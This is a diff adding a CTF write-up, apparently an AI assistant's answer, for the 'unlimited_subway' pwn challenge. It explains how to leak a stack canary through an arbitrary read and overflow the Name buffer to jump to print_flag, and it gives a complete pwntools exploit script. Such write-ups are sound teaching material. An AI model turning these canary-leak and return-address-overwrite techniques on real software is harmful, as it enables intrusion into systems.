@@ -1,0 +1,36 @@
+
+Here are the detailed steps to solve this unlimited_subway pwn challenge:
+
+The program has an arbitrary read vulnerability in the view_account function that can print out an arbitrary index of the account info buffer. This can be used to leak the canary value.
+In the main function, there is a buffer overflow vulnerability when reading the "Name" input. We can overwrite the return address with the address of print_flag function to get the flag.
+To bypass the canary, first use the view_account function to leak the canary value. Then in the payload to overflow the buffer, first provide the leaked canary value, followed by padding and then the address of print_flag.
+The payload will need to be crafted carefully - overflow with the right amount to overwrite the saved return address.
+
+Here is the Python exploit code:
+pythonfrom pwn import *
+
+exe = ELF('./unlimited_subway')
+p = process('./unlimited_subway')
+
+def leak_canary():
+    # View account at index 40 to leak stack canary
+    p.sendlineafter('>', 'V') 
+    p.sendlineafter('Index : ', str(40))
+    p.recvuntil('Index 40 : ')
+    leaked = p.recvline().strip()
+    print("Leaked canary:", leaked)
+    canary = u32(leaked.rjust(4,b'\x00'))
+    return canary
+
+def exploit(canary):
+    padding = b'A' * 44
+    payload = padding + p32(canary) + b'B' * 12 + p32(exe.symbols['print_flag'])
+    p.sendlineafter('>', 'E')
+    p.sendlineafter('Name Size : ', str(len(payload))) 
+    p.sendlineafter('Name : ', payload)
+    p.interactive()
+
+canary = leak_canary()
+exploit(canary)
+This first leaks the canary, then constructs a payload with padding, canary, more padding, return address overwrite, and sends it to trigger the buffer overflow and get code execution.
+The key steps are leaking the canary to bypass stack protection, and overwriting the saved return address with the address of print_flag function. Let me know if you have any other questions!
